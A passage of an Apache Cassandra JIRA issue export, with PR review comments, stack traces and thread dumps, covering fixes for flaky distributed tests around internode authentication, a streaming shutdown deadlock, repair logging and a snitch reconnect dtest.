             executorService.submit(() -> openConnections(cluster));
 
             /*
-             * instance (1) should not connect to instance (2) as authentication fails;
-             * instance (2) should not connect to instance (1) as authentication fails.
+             * Instance (1) should not be able to make outbound connections to instance (2) but Instance (2) should be
+             * accepting outbound connections from Instance (1)

Review Comment:
   `RejectOutboundAuthenticator` is configured only on instance 1 of the cluster and `AllowAllAuthenticator` is configured on instance 2. Any outbound connections or inbound connections on instance 2 should be successful as `AllowAllAuthenticator` is used, where as on instance 1, Inbound connections will be accepted but OutboundConnections will be rejected.



;17/Feb/23 19:05;githubbot;600","yifan-c commented on code in PR #1706:
URL: https://github.com/apache/cassandra/pull/1706#discussion_r1110273015


##########
test/distributed/org/apache/cassandra/distributed/test/InternodeEncryptionEnforcementTest.java:
##########
@@ -86,8 +84,7 @@ public void testInboundConnectionsAreRejectedWhenAuthFails() throws IOException,
             // Wait for authentication to fail
             cluster.get(1).logs().watchFor(""Unable to authenticate peer"");
             cluster.get(1).runOnInstance(runnable);
-            cluster.get(2).logs().watchFor(""Unable to authenticate peer"");
-            cluster.get(2).runOnInstance(runnable);

Review Comment:
   ok.



;17/Feb/23 19:40;githubbot;600","jyothsnakonisa closed pull request #1706: CASSANDRA-17708 Fixing flaky tests in InternodeEncryptionEnforcementTest
URL: https://github.com/apache/cassandra/pull/1706


;20/Feb/23 19:39;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,3600,,,0,3600,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17661,,,,,,,,,,,,,,,,,,,,0.0,Jyothsnakonisa,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Sat Feb 18 01:39:11 UTC 2023,,,jmeredithco,,,,All,,,,"0|z1400w:",9223372036854775807,,,,jonmeredith,ycai,,,Normal,,5.0,,https://github.com/apache/cassandra/commit/4a555f47ee943ce9fd70862cc8127d707e3507a2,,,,,,,,,Ran the tests in the class `InternodeEncryptionEnforcementTest` repeatedly on CircleCi and checked for flakiness.,,,,,"20/Oct/22 15:43;e.dimitrova;I have forgotten about this ticket and hit it again while testing a patch.

org.apache.cassandra.distributed.test.InternodeEncryptionEnforcementTest.testOutboundConnectionsAreInterruptedWhenAuthFails is flaky on trunk. Significantly on JDK8 and quite less with JDK11:

https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1980/workflows/65ac078b-cb6a-4eb9-b8f0-b650e2886c13/jobs/15771/tests#failed-test-0;;;","25/Jan/23 21:50;maedhroz;Saw this again while testing a trunk-based patch (or at least saw the failure from an issue duplicated by this one): https://app.circleci.com/pipelines/github/maedhroz/cassandra/670/workflows/6263f55f-e94b-4ef7-b4f3-975ba0c1fd64/jobs/5859/tests#failed-test-0

{noformat}
junit.framework.AssertionFailedError: expected:<0> but was:<1>
	at org.apache.cassandra.distributed.test.InternodeEncryptionEnforcementTest.lambda$testOutboundConnectionsAreRejectedWhenAuthFails$776879b6$1(InternodeEncryptionEnforcementTest.java:113)
{noformat};;;","03/Feb/23 20:20;dchenbecker;This looks like a race condition and a bad assertion in the unit test. I'm looking at 
testOutboundFallbackOnSSLHandshakeFailure
which touches the same code. In that method, we enqueue a message, initiate the connection, and then just wait for the outbound connection to become connected. At the point where the connection state is changed (allowing outboundConnection.isConnected() to return true), there's no guarantee that the message that force the connection would actually be flushed. I think that for the purpose of this unit test, checking for pending messages is not actually needed, or should potentially be in another test.;;;","16/Feb/23 21:29;Jyothsnakonisa;Configured `RejectOutboundAuthenticator` only on instance 1 of the test cluster and waiting for the authentication error on instance 1 of the cluster fixed the flakiness of the test`InternodeEncryptionEnforcementTest.testOutboundConnectionsAreRejectedWhenAuthFails`.

Also, there is a race condition in the `AllowFirstAndRejectOtherOutboundAuthenticator`, fixing it removed the flakiness in the test `InternodeEncryptionEnforcementTest.testOutboundConnectionsAreInterruptedWhenAuthFails`. ;;;","16/Feb/23 21:33;Jyothsnakonisa;https://github.com/apache/cassandra/pull/1706

https://app.circleci.com/pipelines/github/jyothsnakonisa/cassandra/132/workflows/182dd59d-cffe-4f6e-959e-0c32395b9088;;;","16/Feb/23 22:50;jonmeredith;+1;;;","17/Feb/23 19:44;yifanc;Left some feedback in the PR and got addressed. 
+1 on the patch. ;;;","17/Feb/23 21:55;yifanc;CI Results:
||Branch||Source||Circle CI||
|trunk|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17708-trunk-1662A2B4-3399-4286-B740-E99FABB18E10]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17708-trunk-1662A2B4-3399-4286-B740-E99FABB18E10]|

The patch only contains test code changes. The flaky tests do not fail in the run attached. And [running it repeatedly|https://app.circleci.com/pipelines/github/jyothsnakonisa/cassandra/132/workflows/182dd59d-cffe-4f6e-959e-0c32395b9088/jobs/2017/steps] (500 times) also shows green. ;;;","18/Feb/23 01:39;yifanc;Committed into trunk as [4a555f4|https://github.com/apache/cassandra/commit/4a555f47ee943ce9fd70862cc8127d707e3507a2];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix testRemoteStreamFailure,CASSANDRA-17706,13454650,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,maedhroz,e.dimitrova,e.dimitrova,21/Jun/22 21:04,16/Dec/22 21:54,13/Jul/23 08:40,05/Jul/22 23:58,4.0.5,4.1,4.1-beta1,,,,CI,,,,0,,"Failing on trunk: 
{code:java}
Error Message
java.util.concurrent.TimeoutException

Stacktrace
java.lang.RuntimeException: java.util.concurrent.TimeoutException at org.apache.cassandra.utils.Throwables.maybeFail(Throwables.java:73) at org.apache.cassandra.utils.FBUtilities.waitOnFutures(FBUtilities.java:509) at org.apache.cassandra.distributed.impl.AbstractCluster.close(AbstractCluster.java:1028) at org.apache.cassandra.distributed.test.RepairErrorsTest.testRemoteStreamFailure(RepairErrorsTest.java:179) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) Caused by: java.util.concurrent.TimeoutException at org.apache.cassandra.utils.concurrent.AbstractFuture.get(AbstractFuture.java:253) at org.apache.cassandra.utils.FBUtilities.waitOnFutures(FBUtilities.java:501)
{code}
 ",,dcapwell,e.dimitrova,maedhroz,,,,,,,,,,,,"maedhroz commented on PR #1713:
URL: https://github.com/apache/cassandra/pull/1713#issuecomment-1171887370

   https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17706-trunk&filter=all


;01/Jul/22 03:19;githubbot;600","maedhroz commented on PR #1717:
URL: https://github.com/apache/cassandra/pull/1717#issuecomment-1172516317

   https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17706-4.1&filter=all


;01/Jul/22 16:29;githubbot;600","maedhroz commented on PR #1718:
URL: https://github.com/apache/cassandra/pull/1718#issuecomment-1172840378

   https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17706-4.0&filter=all


;02/Jul/22 05:46;githubbot;600","maedhroz commented on code in PR #1718:
URL: https://github.com/apache/cassandra/pull/1718#discussion_r914020013


##########
src/java/org/apache/cassandra/streaming/StreamTransferTask.java:
##########
@@ -62,6 +61,7 @@ public class StreamTransferTask extends StreamTask
     public StreamTransferTask(StreamSession session, TableId tableId)
     {
         super(session, tableId);
+        timeoutExecutor.setExecuteExistingDelayedTasksAfterShutdownPolicy(false);

Review Comment:
   @dcapwell My thinking here is that given no non-test codepath actually shuts `timeoutExecutor` down, this should be a safe change.



;05/Jul/22 17:11;githubbot;600","maedhroz commented on code in PR #1718:
URL: https://github.com/apache/cassandra/pull/1718#discussion_r914021255


##########
src/java/org/apache/cassandra/streaming/StreamTransferTask.java:
##########
@@ -62,6 +61,7 @@ public class StreamTransferTask extends StreamTask
     public StreamTransferTask(StreamSession session, TableId tableId)
     {
         super(session, tableId);
+        timeoutExecutor.setExecuteExistingDelayedTasksAfterShutdownPolicy(false);

Review Comment:
   Also, when this timeout is scheduled in prod code...
   
   ```
   task.scheduleTimeout(message.header.sequenceNumber, 12, TimeUnit.HOURS);
   ```
   
   :D



;05/Jul/22 17:13;githubbot;600","maedhroz commented on PR #1718:
URL: https://github.com/apache/cassandra/pull/1718#issuecomment-1175611885

   Committed as https://github.com/apache/cassandra/commit/924cd8f52c2437d0a0ce8c48196bb6aa8976fbb8


;05/Jul/22 23:55;githubbot;600","maedhroz closed pull request #1718: CASSANDRA-17706 Make sure existing delayed tasks in StreamTransferTask cannot prevent clean shutdown
URL: https://github.com/apache/cassandra/pull/1718


;05/Jul/22 23:55;githubbot;600","maedhroz closed pull request #1717: CASSANDRA-17706 Relax synchronization on StreamSession#onError() to avoid deadlock
URL: https://github.com/apache/cassandra/pull/1717


;05/Jul/22 23:57;githubbot;600","maedhroz commented on PR #1717:
URL: https://github.com/apache/cassandra/pull/1717#issuecomment-1175612876

   Committed as https://github.com/apache/cassandra/commit/15bdf2e8e7e7a66dd85bf3f86cc58576a13657be


;05/Jul/22 23:57;githubbot;600","maedhroz commented on PR #1713:
URL: https://github.com/apache/cassandra/pull/1713#issuecomment-1175613109

   Committed as https://github.com/apache/cassandra/commit/5c7a47b384acf0f2cc38f9ebe8eff289afe48028


;05/Jul/22 23:58;githubbot;600","maedhroz closed pull request #1713: CASSANDRA-17706 Relax synchronization on StreamSession#onError() to avoid deadlock
URL: https://github.com/apache/cassandra/pull/1713


;05/Jul/22 23:58;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,6600,,,0,6600,,,,,,,,,,,,,,,CASSANDRA-17663,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,maedhroz,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Jul 05 23:58:13 UTC 2022,,,,,,,All,,,,"0|z13zyo:",9223372036854775807,,,,dcapwell,,,,Normal,,4.0,,https://github.com/apache/cassandra/commit/924cd8f52c2437d0a0ce8c48196bb6aa8976fbb8,,,,,,,,,n/a,,,,,"28/Jun/22 22:23;e.dimitrova;This test class is new for a few branches and It might have been committed being flaky, not sure. I see it all the time in CircleCI midres. 
Here is reproduction in [4.1|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1753/workflows/21981540-9461-4efd-91a9-0d9b3160cad2/jobs/12548/tests#failed-test-0] and [trunk|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=RepairErrorsTest-trunk&filter=all], probably it flakes also on the other branches where it was committed. 

[~maedhroz], do you mind to take a look, please? 

 ;;;","29/Jun/22 16:03;maedhroz;Let me see if this is just a simple timeout or some kind of legitimate deadlock....;;;","29/Jun/22 16:06;e.dimitrova;Thanks, appreciate it :) Fingers crossed It is just a timeout :) ;;;","29/Jun/22 16:52;maedhroz;For some reason, the {{MessagingService}} (this test uses {{NETWORK}}) is not shutting down promptly on node 2 every once in a while :-|

(Shutdown completion logging is mine.)

{noformat}
INFO  [node2_isolatedExecutor:17] node2 2022-06-29 11:49:10,035 MessagingService.java:522 - Waiting for messaging service to quiesce
INFO  [node1_isolatedExecutor:13] node1 2022-06-29 11:49:10,035 MessagingService.java:522 - Waiting for messaging service to quiesce
INFO  [node3_isolatedExecutor:3] node3 2022-06-29 11:49:10,035 MessagingService.java:522 - Waiting for messaging service to quiesce
INFO  [node3_isolatedExecutor:3] node3 2022-06-29 11:49:12,103 MessagingService.java:567 - Non-graceful messaging service shutdown complete.
INFO  [node1_isolatedExecutor:13] node1 2022-06-29 11:49:12,103 MessagingService.java:567 - Non-graceful messaging service shutdown complete.

java.lang.RuntimeException: java.util.concurrent.TimeoutException

	at org.apache.cassandra.utils.Throwables.maybeFail(Throwables.java:73)
	at org.apache.cassandra.utils.FBUtilities.waitOnFutures(FBUtilities.java:509)
	at org.apache.cassandra.distributed.impl.AbstractCluster.close(AbstractCluster.java:1028)
{noformat};;;","29/Jun/22 18:07;maedhroz;It looks like every once in a while, the {{defaultGroup}} in {{SocketFactory}} doesn't terminate quickly enough. It's possible there's a task executing there that's hung up...;;;","30/Jun/22 17:15;maedhroz;Alright, so I think I've reproduced a bit of a deadlock during the node 2 shutdown. Here's a blocked thread that's part of the {{defaultGroup}} thread pool mentioned above:

{noformat}
""node2_Messaging-EventLoop-3-10"" Id=1118 BLOCKED on org.apache.cassandra.streaming.StreamSession@7f8372dc owned by ""node2_Stream-Deserializer-/127.0.0.1:7012-ef252195"" Id=1123
	at org.apache.cassandra.streaming.StreamSession.onError(StreamSession.java:649)
	-  blocked on org.apache.cassandra.streaming.StreamSession@7f8372dc
	at org.apache.cassandra.streaming.async.StreamingMultiplexedChannel.onMessageComplete(StreamingMultiplexedChannel.java:264)
	at org.apache.cassandra.streaming.async.StreamingMultiplexedChannel.lambda$sendMessage$1(StreamingMultiplexedChannel.java:233)
	at org.apache.cassandra.streaming.async.StreamingMultiplexedChannel$$Lambda$15818/1783972732.operationComplete(Unknown Source)
	at org.apache.cassandra.utils.concurrent.ListenerList.notifyListener(ListenerList.java:134)
	at org.apache.cassandra.utils.concurrent.ListenerList.notifyListener(ListenerList.java:148)
	at org.apache.cassandra.utils.concurrent.ListenerList$GenericFutureListenerList.notifySelf(ListenerList.java:190)
	at org.apache.cassandra.utils.concurrent.ListenerList.lambda$notifyExclusive$0(ListenerList.java:124)
{noformat}

That {{Stream-Deserializer}} thread looks like this:

{noformat}
""node2_Stream-Deserializer-/127.0.0.1:7012-ef252195"" Id=1123 WAITING
	at sun.misc.Unsafe.park(Native Method)
	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:304)
	at org.apache.cassandra.utils.concurrent.WaitQueue$Standard$AbstractSignal.await(WaitQueue.java:289)
	at org.apache.cassandra.utils.concurrent.WaitQueue$Standard$AbstractSignal.await(WaitQueue.java:282)
	at org.apache.cassandra.utils.concurrent.Awaitable$AsyncAwaitable.await(Awaitable.java:306)
	at org.apache.cassandra.utils.concurrent.AsyncFuture.await(AsyncFuture.java:154)
	at org.apache.cassandra.utils.concurrent.AsyncPromise.await(AsyncPromise.java:244)
	at org.apache.cassandra.net.AsyncChannelPromise.await(AsyncChannelPromise.java:127)
	at org.apache.cassandra.net.AsyncChannelPromise.await(AsyncChannelPromise.java:34)
	at org.apache.cassandra.utils.concurrent.Awaitable$Defaults.awaitUninterruptibly(Awaitable.java:186)
	at org.apache.cassandra.utils.concurrent.AbstractFuture.awaitUninterruptibly(AbstractFuture.java:482)
	at org.apache.cassandra.utils.concurrent.AsyncPromise.awaitUninterruptibly(AsyncPromise.java:254)
	at org.apache.cassandra.net.AsyncChannelPromise.awaitUninterruptibly(AsyncChannelPromise.java:133)
	at org.apache.cassandra.net.AsyncChannelPromise.awaitUninterruptibly(AsyncChannelPromise.java:34)
	at org.apache.cassandra.utils.concurrent.Future.syncUninterruptibly(Future.java:94)
	at org.apache.cassandra.utils.concurrent.AsyncPromise.syncUninterruptibly(AsyncPromise.java:186)
	at org.apache.cassandra.net.AsyncChannelPromise.syncUninterruptibly(AsyncChannelPromise.java:121)
	at org.apache.cassandra.net.AsyncChannelPromise.syncUninterruptibly(AsyncChannelPromise.java:34)
	at org.apache.cassandra.streaming.StreamSession.onError(StreamSession.java:673)
	at org.apache.cassandra.streaming.StreamDeserializingTask.run(StreamDeserializingTask.java:84)
{noformat}

Multiple threads are hitting the failure handling pathways on node 2 when node 1 fails its streaming session, and either we need to avoid sending a failure message in {{onError()}} when the local session is in a final state, or we need to allow that, but not {{syncUninterruptibly()}} on it.;;;","01/Jul/22 03:09;maedhroz;I have a [clean multiplexer run|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17706-deadlock&filter=all] (400 iterations) against a fix that relaxes the synchronization requirements for {{StreamSession#onError()}}. Patch should be incoming soon...;;;","01/Jul/22 03:25;maedhroz;The patch here basically just relaxes the synchronization on {{StreamSession#onError()}}, which allows error handling to proceed even if multiple threads arrive there, avoiding the possibility that waiting for the result of sending the failure message can cause a deadlock. (i.e. Processing a failure on a send initiated from {{onError()}} can end up right back in {{onError()}}, which is logically reentrant but doesn't happen on literally the same thread.) This shouldn't really be a problem, given {{closeSession()}} itself is still synchronized, we still won't send a failure message if channels are closed, and we now just use {{awaitUninterruptibly()}} instead of {{syncUninterruptibly()}} (and avoid re-throwing if an error occurs).

|[4.1|https://github.com/apache/cassandra/pull/1717]|[CircleCI|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17706-4.1&filter=all]|
|[trunk|https://github.com/apache/cassandra/pull/1713]|[CircleCI|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17706-trunk&filter=all]|;;;","01/Jul/22 03:28;dcapwell;+1;;;","01/Jul/22 16:10;maedhroz;Running the tests once more before adding the other patches and committing, now that CASSANDRA-17700 has been fixed.;;;","01/Jul/22 16:47;maedhroz;4.1 patch is up and tests are in progress (updated table above). I'm actually not sure how this happens in 4.0, so investigating that further...
;;;","02/Jul/22 04:55;maedhroz;So in 4.0, the nominal cause of the problem mentioned above doesn't exist. What does seem to happen every so often though is that the scheduled (delay) timeout task in {{StreamTransferTask}} isn't terminated on {{Instance}} shutdown, and this causes cluster closure to timeout. The fix is pretty simple for that, and it seems like the multiplexer [likes it|https://app.circleci.com/pipelines/github/maedhroz/cassandra/455/workflows/e0fc99c3-7cd0-4238-92c7-6a3e1bbc078d], so I should have a 4.0 patch up soon.;;;","02/Jul/22 05:47;maedhroz;|[4.0|https://github.com/apache/cassandra/pull/1718]|[CircleCI|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17706-4.0&filter=all]|

[~dcapwell] The 4.0 patch is ready for review ;);;;","05/Jul/22 17:33;maedhroz;In terms of the failures in {{test_recover_negative_expiration_date_sstables_with_scrub}}, it looks like [it fails even with vanilla 4.0|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17706-4.0-CircleCI&filter=all] on Circle. Will create a separate Jira. I'm also planning on creating a separate Jira to look at a general possible in-JVM shutdown order issue between the messaging service and scheduled executors.;;;","05/Jul/22 17:38;dcapwell;+1 from me;;;","05/Jul/22 18:55;maedhroz;Created CASSANDRA-17730 to deal with {{test_recover_negative_expiration_date_sstables_with_scrub}}.;;;","05/Jul/22 20:02;maedhroz;Created CASSANDRA-17731 to track down scheduled task/messaging service shutdown order issues.;;;","05/Jul/22 23:58;maedhroz;Committed

4.0 - https://github.com/apache/cassandra/commit/924cd8f52c2437d0a0ce8c48196bb6aa8976fbb8
4.1 - https://github.com/apache/cassandra/commit/15bdf2e8e7e7a66dd85bf3f86cc58576a13657be
trunk - https://github.com/apache/cassandra/commit/5c7a47b384acf0f2cc38f9ebe8eff289afe48028;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failing test: TestRepair.test_failure_during_validation ,CASSANDRA-17701,13454588,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jlewandowski,brandon.williams,brandon.williams,21/Jun/22 14:21,21/Mar/23 09:36,13/Jul/23 08:40,21/Mar/23 09:36,3.0.29,3.11.15,,,,,Consistency/Repair,,,,0,,"https://ci-cassandra.apache.org/job/Cassandra-3.11/371/testReport/dtest.repair_tests.repair_test/TestRepair/test_failure_during_validation/

{noformat}
Unexpected error found in node logs (see stdout for full details). Errors: [[node1] 'ERROR [Repair#1:1] 2022-06-19 16:45:53,295 CassandraDaemon.java:237 - Exception in thread Thread[Repair#1:1,5,RMI Runtime]\njava.util.concurrent.CancellationException: Task was cancelled.\n\tat com.google.common.util.concurrent.AbstractFuture.cancellationExceptionWithCause(AbstractFuture.java:392)\n\tat com.google.common.util.concurrent.AbstractFuture$Sync.getValue(AbstractFuture.java:306)\n\tat com.google.common.util.concurrent.AbstractFuture$Sync.get(AbstractFuture.java:286)\n\tat com.google.common.util.concurrent.AbstractFuture.get(AbstractFuture.java:116)\n\tat com.google.common.util.concurrent.Uninterruptibles.getUninterruptibly(Uninterruptibles.java:137)\n\tat com.google.common.util.concurrent.Futures.getUnchecked(Futures.java:1509)\n\tat org.apache.cassandra.repair.RepairJob.run(RepairJob.java:138)\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\n\tat org.apache.cassandra.concurrent.NamedThreadFactory.lambda$threadLocalDeallocator$0(NamedThreadFactory.java:83)\n\tat java.lang.Thread.run(Thread.java:748)\nCaused by: java.util.concurrent.CancellationException: Future.cancel() was called.\n\tat com.google.common.util.concurrent.AbstractFuture$Sync.complete(AbstractFuture.java:378)\n\tat com.google.common.util.concurrent.AbstractFuture$Sync.cancel(AbstractFuture.java:355)\n\tat com.google.common.util.concurrent.AbstractFuture.cancel(AbstractFuture.java:131)\n\tat com.google.common.util.concurrent.Futures$CombinedFuture.setOneValue(Futures.java:1752)\n\tat com.google.common.util.concurrent.Futures$CombinedFuture.access$400(Futures.java:1608)\n\tat com.google.common.util.concurrent.Futures$CombinedFuture$2.run(Futures.java:1686)\n\tat com.google.common.util.concurrent.MoreExecutors$DirectExecutor.execute(MoreExecutors.java:457)\n\tat com.google.common.util.concurrent.ExecutionList.executeListener(ExecutionList.java:156)\n\tat com.google.common.util.concurrent.ExecutionList.execute(ExecutionList.java:145)\n\tat com.google.common.util.concurrent.AbstractFuture.cancel(AbstractFuture.java:134)\n\tat org.apache.cassandra.repair.RepairSession.forceShutdown(RepairSession.java:320)\n\tat org.apache.cassandra.repair.RepairSession.convict(RepairSession.java:359)\n\tat org.apache.cassandra.gms.FailureDetector.interpret(FailureDetector.java:297)\n\tat org.apache.cassandra.gms.Gossiper.doStatusCheck(Gossiper.java:891)\n\tat org.apache.cassandra.gms.Gossiper$GossipTask.run(Gossiper.java:239)\n\tat org.apache.cassandra.concurrent.DebuggableScheduledThreadPoolExecutor$UncomplainingRunnable.run(DebuggableScheduledThreadPoolExecutor.java:118)\n\tat java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)\n\tat java.util.concurrent.FutureTask.runAndReset(FutureTask.java:308)\n\tat java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$301(ScheduledThreadPoolExecutor.java:180)\n\tat java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:294)\n\t... 4 common frames omitted']
{noformat}",,e.dimitrova,jlewandowski,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jlewandowski,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Mar 20 14:30:00 UTC 2023,,,,,,,All,,,,"0|z13zl4:",9223372036854775807,,,,brandon.williams,,,,Normal,,3.0.0,,https://github.com/apache/cassandra/commit/f6a04ca81f2d0d8973fb7a99569c118122c500a2,,,,,,,,,regression tests,,,,,"21/Jun/22 14:22;brandon.williams;Consistently failing on both 3.0 and 3.11;;;","21/Jun/22 14:43;e.dimitrova;Side note: Seems like it started consistently failing when the DTests bug was fixed in the dtest repo so even if we see in Butler where it started failing, could be that this error message was there for a way longer time and the test was supposed to fail but it wasn't. For bisecting it is probably good to test it with the applied patch from [this commit|https://github.com/apache/cassandra-dtest/commit/be48c417e6bbbd7c58f43ed001c9a2209a6339ab] so we can reproduce the failure.;;;","18/Mar/23 07:38;jlewandowski;3.0 - https://github.com/apache/cassandra/pull/2229 - https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/2355/

3.11 - https://github.com/apache/cassandra/pull/2230 - https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/2356/;;;","18/Mar/23 07:39;jlewandowski;It seems like it is just a logging problem. In addition to the message that the repair job had failed (which was expected), it logged separately a cancellation exception.
;;;","20/Mar/23 12:18;brandon.williams;I think as seen in your CI runs, this breaks the TestDeprecatedRepairNotifications.test_deprecated_repair_error_notification test.;;;","20/Mar/23 13:02;jlewandowski;hmmm... you talking about this: https://issues.apache.org/jira/browse/CASSANDRA-18156 ?;;;","20/Mar/23 13:02;jlewandowski;it seems like it is failing for some time already https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-3.0/cassandra-3.0;;;","20/Mar/23 14:26;brandon.williams;Ah, indeed it looks like it has.  Nevermind then, +1 from me.;;;","20/Mar/23 14:30;jlewandowski;thanks [~brandon.williams];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix TestGossipingPropertyFileSnitch.test_prefer_local_reconnect_on_listen_address,CASSANDRA-17700,13451376,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,Jyothsnakonisa,e.dimitrova,e.dimitrova,20/Jun/22 16:44,01/Jul/22 19:47,13/Jul/23 08:40,01/Jul/22 03:34,5.0,,,,,,CI,,,,0,,"It is consistently failing in trunk after

CASSANDRA-17661. Maybe a debug message has changed or something?

CC [~Jyothsnakonisa], [~jmeredithco] , [~ycai] 
{code:java}
Error Message
ccmlib.node.TimeoutError: 14 Jun 2022 02:38:50 [node1] after 60.07/60 seconds Missing: ['tiated reconnect to an Internal IP (\\/)?127.0.0.2(:7000)? for the (\\/)?127.0.0.4(:7000)?'] not found in debug.log:  Head: INFO  [main] 2022-06-14 02:36:25,360 YamlConfigura  Tail: ...7.0.0.3:7000(/127.0.0.1:43890)->/127.0.0.4:7000-LARGE_MESSAGES-8f378c72 successfully connected, version = 12, framing = CRC, encryption = unencrypted
Stacktrace
self = <snitch_test.TestGossipingPropertyFileSnitch object at 0x7f2e6ec50dc0>

    def test_prefer_local_reconnect_on_listen_address(self):
        """"""
            @jira_ticket CASSANDRA-9748
            @jira_ticket CASSANDRA-8084
    
            Test that it's possible to connect over the broadcast_address when
            listen_on_broadcast_address=true and that GossipingPropertyFileSnitch
            reconnect via listen_address when prefer_local=true
            """"""
    
        NODE1_LISTEN_ADDRESS = '127.0.0.1'
        NODE1_BROADCAST_ADDRESS = '127.0.0.3'
    
        NODE2_LISTEN_ADDRESS = '127.0.0.2'
        NODE2_BROADCAST_ADDRESS = '127.0.0.4'
    
        STORAGE_PORT = 7000
    
        cluster = self.cluster
        cluster.populate(2)
        node1, node2 = cluster.nodelist()
    
        running40 = node1.get_base_cassandra_version() >= 4.0
    
        cluster.seeds = [NODE1_BROADCAST_ADDRESS]
        cluster.set_configuration_options(values={'endpoint_snitch': 'org.apache.cassandra.locator.GossipingPropertyFileSnitch',
                                                  'listen_on_broadcast_address': 'true'})
        node1.set_configuration_options(values={'broadcast_address': NODE1_BROADCAST_ADDRESS})
        node2.auto_bootstrap = True
        node2.set_configuration_options(values={'broadcast_address': NODE2_BROADCAST_ADDRESS})
    
        for node in cluster.nodelist():
            with open(os.path.join(node.get_conf_dir(), 'cassandra-rackdc.properties'), 'w') as snitch_file:
                snitch_file.write(""dc=dc1"" + os.linesep)
                snitch_file.write(""rack=rack1"" + os.linesep)
                snitch_file.write(""prefer_local=true"" + os.linesep)
    
        node1.start(wait_for_binary_proto=True)
    
        self._test_connect(NODE1_LISTEN_ADDRESS, STORAGE_PORT)
        self._test_connect(NODE1_BROADCAST_ADDRESS, STORAGE_PORT)
    
        # write some data to node1
        node1.stress(['write', 'n=10K', 'no-warmup', '-rate', 'threads=8'])
    
        session = self.patient_cql_connection(node1)
        stress_table = 'keyspace1.standard1'
        original_rows = list(session.execute(""SELECT * FROM {}"".format(stress_table)))
    
        node2.start(wait_for_binary_proto=True, wait_other_notice=False)
    
        self._test_connect(NODE2_LISTEN_ADDRESS, STORAGE_PORT)
        self._test_connect(NODE2_BROADCAST_ADDRESS, STORAGE_PORT)
    
        # substring for Intiated -> Initiated typo was fixed in 3.10
